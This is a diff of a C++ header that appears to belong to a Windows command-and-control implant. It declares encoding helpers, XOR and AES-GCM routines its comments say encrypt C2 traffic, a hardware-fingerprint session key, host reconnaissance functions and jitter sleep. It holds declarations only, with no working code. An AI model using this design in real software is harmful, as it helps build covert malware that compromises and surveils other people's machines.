@@ -6,52 +6,47 @@
 // ---------------------------------------------------------------------------
 // String conversion
 // ---------------------------------------------------------------------------
-
-// UTF-16 (wstring) -> UTF-8 (string)
-std::string WStringToUTF8(const std::wstring& wstr);
-
-// UTF-8 (string) -> UTF-16 (wstring)
+std::string  WStringToUTF8(const std::wstring& wstr);
 std::wstring UTF8ToWString(const std::string& utf8);
 
 // ---------------------------------------------------------------------------
 // Encoding
 // ---------------------------------------------------------------------------
-
-// Base64 encode raw bytes -> ASCII string
-std::string Base64Encode(const BYTE* data, size_t len);
-
-// Base64 decode ASCII string -> raw bytes
-std::vector<BYTE> Base64Decode(const std::string& b64);
+std::string        Base64Encode(const BYTE* data, size_t len);
+std::vector<BYTE>  Base64Decode(const std::string& b64);
 
 // ---------------------------------------------------------------------------
-// Crypto
+// XOR cipher — in-place, repeating key
 // ---------------------------------------------------------------------------
-
-// In-place XOR cipher with repeating key
 VOID XorBuffer(BYTE* data, size_t len, const BYTE* key, size_t keyLen);
+
+// ---------------------------------------------------------------------------
+// AES-256-GCM (BCrypt) — double-encrypts C2 traffic
+//   Wire format: Base64( nonce[12] || tag[16] || ciphertext )
+// ---------------------------------------------------------------------------
+std::string AesGcmEncrypt(const std::vector<BYTE>& key32,
+                          const std::string& plaintext);
+
+std::string AesGcmDecrypt(const std::vector<BYTE>& key32,
+                          const std::string& b64Wire);
+
+// ---------------------------------------------------------------------------
+// Hardware-derived 32-byte session key
+//   SHA-256( VolumeSerial(C:\) || CPUID(leaf1) || ComputerName )
+//   Unique per host, reproducible — server derives same key from session ID.
+// ---------------------------------------------------------------------------
+std::vector<BYTE> DeriveHardwareKey();
 
 // ---------------------------------------------------------------------------
 // System info
 // ---------------------------------------------------------------------------
-
-// FNV-1a hash of the computer name, returned as 8-char hex wstring
-std::wstring GetHostnameHash();
-
-// Current username
+std::wstring GetHostnameHash();   // FNV-1a 32-bit → 8-char hex wstring
 std::wstring GetUsername();
-
-// Computer name (raw, not hashed)
 std::wstring GetHostname();
-
-// OS build number via RtlGetVersion (immune to compatibility shims)
-DWORD GetOSBuild();
-
-// TRUE if the current process token has elevation
-BOOL IsElevated();
+DWORD        GetOSBuild();        // via RtlGetVersion (shim-immune)
+BOOL         IsElevated();        // TokenElevation query
 
 // ---------------------------------------------------------------------------
 // Timing
 // ---------------------------------------------------------------------------
-
-// Sleep for a uniformly random duration in [minSec, maxSec]
-VOID JitterSleep(DWORD minSec, DWORD maxSec);
+VOID JitterSleep(DWORD minSec, DWORD maxSec);  // uniform distribution
